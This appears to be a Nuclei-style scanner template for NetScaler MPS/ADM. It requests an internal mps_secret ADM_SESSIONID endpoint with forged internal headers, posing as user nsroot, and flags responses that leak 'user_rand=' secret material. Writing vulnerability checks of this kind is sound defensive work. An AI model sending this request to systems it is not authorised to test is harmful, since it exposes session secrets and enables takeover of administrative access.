id: netscaler-mps-internal-secret-leak

info:
  name: Netscaler MPS Internal Secret Leak
  author: naures
  severity: high
  description: |
    Attempts to access the internal mps_secret ADM_SESSIONID endpoint with forged headers.
    Detects leakage of user_rand= secret material.
  tags: netscaler,exposure,internal

requests:
  - method: GET
    path:
      - "{{BaseURL}}/internal/v2/config/mps_secret/ADM_SESSIONID"

    headers:
      Tenant-Name: Owner
      User-Name: nsroot
      Mps-Internal-Request: true

    matchers:
      - type: word
        words:
          - "user_rand="
        part: body
